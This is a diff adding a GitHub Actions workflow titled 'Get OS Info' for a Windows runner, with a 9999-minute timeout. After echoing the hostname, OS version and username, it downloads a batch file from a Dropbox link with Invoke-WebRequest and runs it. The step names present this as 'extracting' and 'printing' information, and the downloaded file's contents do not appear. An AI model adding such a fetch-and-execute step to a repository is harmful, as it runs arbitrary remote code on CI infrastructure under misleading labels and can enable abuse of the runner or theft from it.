@@ -1,0 +1,27 @@
+name: Get OS Info
+
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Getting Host Info...
+    runs-on: windows-latest
+    timeout-minutes: 9999
+    
+    steps:
+      - name: Hostname
+        run: cmd /c "echo OS Hostname - %COMPUTERNAME%"
+
+      - name: Version
+        run: cmd /c "ver"
+
+      - name: Username
+        run: cmd /c "echo OS Username - %USERNAME%"
+
+      - name: Extract the remaining information..
+        run: Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/k086mtr7gu3z57raau8dm/infocheckerinbatch.txt?rlkey=0ltjkjxjefr2wh5upc0cmhf3v&dl=1" -OutFile "CheckInfo.bat"
+
+      - name: Print out the last things remaining
+        run: cmd /c CheckInfo.bat
+
